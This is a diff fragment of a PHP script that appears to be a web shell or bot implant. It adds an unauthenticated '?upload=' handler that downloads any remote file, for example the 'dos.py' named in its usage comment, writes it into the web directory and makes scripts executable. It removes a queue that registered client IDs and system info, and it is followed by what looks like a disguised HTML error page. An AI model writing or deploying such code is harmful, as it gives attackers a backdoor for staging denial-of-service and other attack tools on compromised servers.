+// Usage: ?upload=https://raw.../dos.py&filename=dos.py
+if (isset($_GET['upload']) && isset($_GET['filename'])) {
+    ob_end_clean();
+    header('Content-Type: application/json; charset=utf-8');
 
-    // Kayıt isteğini kuyruğa al (dosya bazlı, HTTP yok)
-    $queue_file = __DIR__ . '/.mori_queue';
-    $entry = json_encode([
-        'id'        => $client_id,
-        'timestamp' => time(),
-        'sysinfo'   => [] // Agent mode'da doldurulur
-    ]);
-    @file_put_contents($queue_file, $entry . "\n", FILE_APPEND | LOCK_EX);
-});
+    $src_url  = trim($_GET['upload']);
+    $filename = trim($_GET['filename']);
+    $filename = basename($filename); // strip any directory component
+
+    if (!filter_var($src_url, FILTER_VALIDATE_URL) || !preg_match('/^https?:\/\//i', $src_url)) {
+        die(json_encode(['ok' => false, 'error' => 'invalid_url']));
+    }
+    if ($filename === '' || strpos($filename, '..') !== false) {
+        die(json_encode(['ok' => false, 'error' => 'invalid_filename']));
+    }
+
+    $content = fetch_url_content($src_url, 30);
+    if ($content === false || $content === '') {
+        die(json_encode(['ok' => false, 'error' => 'fetch_failed', 'url' => $src_url]));
+    }
+
+    $target  = __DIR__ . '/' . $filename;
+    $written = @file_put_contents($target, $content);
+    if ($written === false) {
+        die(json_encode(['ok' => false, 'error' => 'write_failed', 'path' => $target]));
+    }
+
+    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    @chmod($target, in_array($ext, ['py', 'sh', 'pl', 'rb']) ? 0755 : 0644);
+
+    die(json_encode([
+        'ok'    => true,
+        'file'  => $target,
+        'url'   => $src_url,
+        'size'  => $written,
+        'bytes' => strlen($content),
+    ]));
+}
+
+// .mori_queue: removed — was FILE_APPEND on every request but never read, would fill disk
 ?>
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html>
